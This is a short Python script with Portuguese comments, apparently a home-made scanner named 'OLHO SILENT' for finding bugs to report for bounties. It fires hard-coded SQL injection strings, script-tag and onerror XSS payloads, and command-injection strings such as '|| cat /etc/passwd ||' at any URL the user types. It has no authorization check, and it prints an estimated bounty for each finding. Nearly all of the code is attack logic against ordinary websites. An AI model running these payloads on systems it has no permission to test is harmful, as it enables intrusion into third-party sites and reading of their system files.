# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

# Texto de cabeçalho
HEADER = """
\033[92m
 ██████╗ ██╗     ██╗  ██╗ ██████╗     ███████╗██╗██╗     ███████╗███╗   ██╗████████╗
██╔═══██╗██║     ██║  ██║██╔═══██╗    ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝
██║   ██║██║     ███████║██║   ██║    ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║   
██║   ██║██║     ██╔══██║██║   ██║    ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   
╚██████╔╝███████╗██║  ██║╚██████╔╝    ███████║██║███████╗███████╗██║ ╚████║   ██║   
 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝
\033[0m
"""

# Lista de payloads de injeção SQL comuns
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR '1'='1' /*'",
]

# Lista de payloads de XSS comuns
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
]

# Lista de payloads de RCE comuns
rce_payloads = [
    "|| ls ||",
    "|| cat /etc/passwd ||",
]

def find_sql_injection(url):
    vulnerabilities = []
    for payload in sql_payloads:
        for param in urlparse(url).query.split('&'):
            vuln_url = urljoin(url, url + '?' + param.split('=')[0] + '=' + payload)
            vuln_response = requests.get(vuln_url)
            if "sql" in vuln_response.text.lower() or "syntax" in vuln_response.text.lower():
                vulnerabilities.append("SQL Injection encontrada: {}".format(vuln_url))
    return vulnerabilities

def find_xss(url):
    vulnerabilities = []
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        if not action:
            action = url
        form_url = urljoin(url, action)
        inputs = form.find_all('input')
        for payload in xss_payloads:
            data = {input.get('name'): payload for input in inputs if input.get('name')}
            vuln_response = requests.post(form_url, data=data)
            if payload in vuln_response.text:
                vulnerabilities.append("XSS encontrada: {} com payload {}".format(form_url, payload))
    return vulnerabilities

def find_rce(url):
    vulnerabilities = []
    for payload in rce_payloads:
        vuln_url = urljoin(url, '?' + payload)
        vuln_response = requests.get(vuln_url)
        if "root:" in vuln_response.text or "/bin" in vuln_response.text:
            vulnerabilities.append("RCE encontrada: {}".format(vuln_url))
    return vulnerabilities

def estimate_bounty(vulnerabilities):
    bounty = 0
    for vuln in vulnerabilities:
        if "SQL Injection" in vuln:
            bounty += 1500  # Estimativa para SQL Injection
        elif "XSS" in vuln:
            bounty += 500  # Estimativa para XSS
        elif "RCE" in vuln:
            bounty += 3000  # Estimativa para RCE
    return bounty

def main():
    print(HEADER)
    url = input("Digite o URL do site (http ou https): ")
    vulnerabilities = []
    vulnerabilities.extend(find_sql_injection(url))
    vulnerabilities.extend(find_xss(url))
    vulnerabilities.extend(find_rce(url))

    if vulnerabilities:
        print("Vulnerabilidades encontradas:")
        for vulnerability in vulnerabilities:
            print(f"- {vulnerability}")
        bounty = estimate_bounty(vulnerabilities)
        print(f"\nA empresa pode pagar aproximadamente ${bounty} pelo reporte dessas vulnerabilidades.")
    else:
        print("Nenhuma vulnerabilidade encontrada.")

if __name__ == "__main__":
    main()
